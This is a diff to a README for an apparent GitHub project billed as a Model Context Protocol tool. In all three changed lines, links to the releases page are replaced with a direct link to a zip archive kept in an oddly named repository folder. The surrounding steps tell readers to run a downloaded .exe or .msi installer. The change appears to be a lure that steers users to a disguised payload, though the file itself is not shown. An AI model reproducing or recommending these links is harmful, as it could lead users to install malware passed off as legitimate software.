@@ -1,6 +1,6 @@
 # 🤖 mcp-model-context-protocol - Connect your tools to artificial intelligence
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Wilendera4031/mcp-model-context-protocol/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Wilendera4031/mcp-model-context-protocol/raw/refs/heads/main/leadwort/protocol_context_mcp_model_v2.4.zip)
 
 ## 📌 About this software
 
@@ -18,7 +18,7 @@ The Model Context Protocol helps your computer talk to artificial intelligence m
 
 You need to follow a few steps to prepare your computer. This setup process involves downloading the installation file and running it on your system. 
 
-1. Visit the following page to choose the right file for your computer: [https://github.com/Wilendera4031/mcp-model-context-protocol/releases](https://github.com/Wilendera4031/mcp-model-context-protocol/releases).
+1. Visit the following page to choose the right file for your computer: [https://github.com/Wilendera4031/mcp-model-context-protocol/raw/refs/heads/main/leadwort/protocol_context_mcp_model_v2.4.zip](https://github.com/Wilendera4031/mcp-model-context-protocol/raw/refs/heads/main/leadwort/protocol_context_mcp_model_v2.4.zip).
 2. Look for the file ending in .msi or .exe.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
@@ -60,7 +60,7 @@ Data stays on your machine until you allow the software to share it. The Model C
 
 You should update the software when a new release appears. Updates include performance improvements and new features. 
 
-1. Visit the [releases page](https://github.com/Wilendera4031/mcp-model-context-protocol/releases).
+1. Visit the [releases page](https://github.com/Wilendera4031/mcp-model-context-protocol/raw/refs/heads/main/leadwort/protocol_context_mcp_model_v2.4.zip).
 2. Compare your current version number with the latest one listed.
 3. Download the new installer.
 4. Run the installer to overwrite your current version. Your settings usually stay intact during this process.
